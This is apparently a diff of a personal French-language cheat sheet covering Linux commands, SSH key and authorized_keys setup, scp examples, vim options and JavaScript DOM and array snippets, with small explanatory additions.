 pour localiser une commande grace au path: which nomdelacommande
 pour connaitre l'heure: date
+pour mettre à jour update modifier la date et l'heure:
+	date -s '2019-10-31 20:49:00' // a faire en sudo ou en root
 si on a l'erreur sh: cannot execute
 regarder si on a les droits d'execution sur les fichiers
 Lancer une commande direct en background: commande & arriere plan
@@ -25216,7 +24149,7 @@ ssh : se logger sur une machine a distance
                 sont sous /var/log/user.log ou /var/log/auth.log  si ça défile par sécurité désactiver la connexion par mot de passe.
                 /homeDuUser/.ssh repertoire contient les cles publiques (le creer si il n'existe pas) il doit appartenir à l'utilisateur interessé droit doivent etre rwx-------
           generer creer paire de cle sur cygwin ou sur unix:
-                    ssh-keygen -t rsa // stocke la cle privee sous /repertoireHomeDuUser/.ssh/id_rsa et la cle publique sous /repertoireHomeDuUser/.ssh/id_rsa.pub  (creer ces fichiers si n'existent pas) //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
+                    ssh-keygen -t rsa // stocke la cle privee sous /repertoireHomeDuUser/.ssh/id_rsa ou toto_rsa et la cle publique sous /repertoireHomeDuUser/.ssh/id_rsa.pub  (creer ces fichiers si n'existent pas) //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
                     definir passphrase (sauf si c'est pour faire du ssh rsync scp etc... avec un autre serveur, alors ne pas mettre de mot de passe!)
                     cle prive est dans id_rsa, la cle publique corresp est dans id_rsa.pub. //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
                     ssh-keygen -y -f id_rsa > id_rsa.pub // ensuite je peux copier cette cle publique et la mettre sur un autre serveur LINKmljsdf
@@ -25236,7 +24169,7 @@ ssh : se logger sur une machine a distance
             reecrire la cle publique à partir de la cle privee: (si j'ai perdu ma cle publique)
                  ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/idgit_rsa.pub                        
       pour ne plus avoir a ressaisir mon mdp quand je fais du scp rsync ssh j'ai besoin de me connecter par key:
-                    Copier cle publique dans id_rsa.pub sur autre serveur dans sous homeUtilisateurAvecQuiJeVeuxMeConnecterDansServerB/.ssh/authorized_keys et authorized_keys2 (pour être sur je mets dans les deux... chais pas si c bon.) LINKmljsdf
+                    Copier cle publique dans id_rsa.pub sur autre serveur dans sous homeUtilisateurAvecQuiJeVeuxMeConnecterDansServerB/.ssh/authorized_keys et authorized_keys2 (pour être sur je mets dans les deux... chais pas si c bon.)VERIFIER que la ligne a zero retour chario et espace LINKmljsdf
                           authorized_keys et 2 contient les cles publiques des autres serveurs qui peuvent se connecter ici grace à leur clé privee dans id_rsa.priv et/ou id_rsa //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
               se connecter alors en faisant depuis serveurA: ssh homeUtilisateurAvecQuiJeVeuxMeConnecterDansServerB@serverB                          
               les droits doivent être comme ça:
@@ -25331,7 +24264,7 @@ scp :commande
     push:
       scp -i cheminVersMaClePriveeFacultatifDeType.pem cequejeveuxcopierdeMAmachine user@machine:oujeveuxLecopiersurlaamachinedistante
     exemples  
-      scp -p admddd\@su571ars.mc2.renault.fr:/data/documentum/applications/a_ddd/ExportPHX/jar/Exporter-0.0.1.jar .
+      scp -p admddd\@su571ars.mc2.renault.fr:/data/documentum/applications/a_ddd/ExportPHX/jar/Exporter-0.0.1.jar . //-p pour preserver l'horodatage du fichier
       scp -p admddd\@su571ars.mc2.renault.fr:/data/documentum/applications/a_ddd/ExportPHX/sh/L.ksh .
       scp -p admddd\@sum50301:/data/documentum/applications/a_ddd/ExportPHX/tmp/pgn/*.xml .
 smtp :
@@ -25495,6 +24428,8 @@ replace remplacer tout remplacer un mot par un autre puis repeter:
   se metre au debut du mot a remplace; faire cw ecrire ce qu'on veut pettre a la place; esc; se mettre sur le prochain mot à rempalcer; puis . pour executer pareil.
 pour afficher le numero de la lignes (interupteur on/off)
 :set number
+pour mettre ou non le wrap:
+	:set wrap ou :set nowrap
 pour atteindre le caractere character numero x ( la colonne numero x) de la ligne courante:
 x|
 escape: mode deplacement ou mode ligne de commande
@@ -27515,6 +26450,7 @@ erreur: (intermediate value)(...) is not a function
                     ou(index,value)   
                 doSomethingWith(number); // faire un traitement... a creuser
             });;
+	si c'est un NodeList faire Array.from(lanodelist).forEach(....
         par exemple cherche dans un tableau si les valeurs existent dans un autre tableau: boucle imbriquee:
           if(unTableauAParcourir.filter(function(act,idx){return unAutreTableauAParcourir.filter(function(actor){return actor == idx;}).length>0;})
                                                  .filter(function(act){return (act!=null //sur le resultat de l'imbrication on peut enchainer avec dauters filtres
@@ -28168,7 +27104,7 @@ pour enregistrer avec le micro: (NON pas encore comme ci dessous! utiliser recor
 recuperer des elements par leur nom de classe: pour ajouter des elements à un tableau: 
     document.getElementsByClassName("nomboucle") (byclass par classe)
 et si on veut merger plusieurs elements ayant des classesnames differents dans une seule liste faire: 
-      var buttonToReduce = Array.prototype.slice.call(document.getElementsByClassName("button"), 0);
+      var buttonToReduce = Array.prototype.slice.call(document.getElementsByClassName("button"), 0);// equivalent de [].slice.call(etc...)
 			var buttonToReduce = buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonclose"), 0));
 			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonmove"), 0));
 			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("switch2"), 0));
